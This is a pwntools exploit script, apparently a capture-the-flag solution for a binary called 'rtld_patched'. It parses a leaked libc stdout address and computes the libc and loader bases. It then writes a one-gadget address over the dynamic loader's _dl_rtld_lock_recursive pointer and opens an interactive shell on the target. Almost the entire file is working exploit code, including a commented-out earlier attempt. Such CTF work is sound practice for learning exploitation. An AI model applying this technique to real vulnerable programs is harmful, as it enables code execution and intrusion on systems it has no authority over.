#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('rtld_patched')
libc = exe.libc
ld = ELF("./ld-linux-x86-64.so.2")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
brva 0xb9d
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():


    io.recvuntil(b"stdout: ")
    stdout = int(io.recvline().strip(), 16)
    libc.address = stdout - libc.sym["_IO_2_1_stdout_"]
    
    ld_base = libc.address + 0x3ca000
    dl_rtld_lock_recursive = ld_base + 0x226f48

    og = libc.address + 0xf03a4

    info("libc base: %#x", libc.address)
    info("dl_rtld_lock_recursive: %#x", dl_rtld_lock_recursive)
    info("one gadget: %#x", og)

    io.sendlineafter(b"addr: ", str(dl_rtld_lock_recursive).encode())
    io.sendlineafter(b"value: ", str(og).encode())


    # io.recvuntil(b"stdout: ")
    # stdout = int(io.recvline().strip(), 16)
    # libc.address = stdout - libc.sym["_IO_2_1_stdout_"]

    # ld_base = libc.address + 0x400000 # 0x5ef000
    # rtld_global = ld_base + ld.sym["_rtld_global"]
    # dl_rtld_lock_recursive = rtld_global + 0xf08
    # dl_load_lock = rtld_global + 0x908

    # og = libc.address + 0xf1247
    # og = 0xdeadbeef

    # info("libc base: %#x", libc.address)
    # info("one gadget: %#x", og)

    # io.sendlineafter(b"addr: ", str(dl_rtld_lock_recursive).encode())
    # io.sendlineafter(b"value: ", str(og).encode())

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

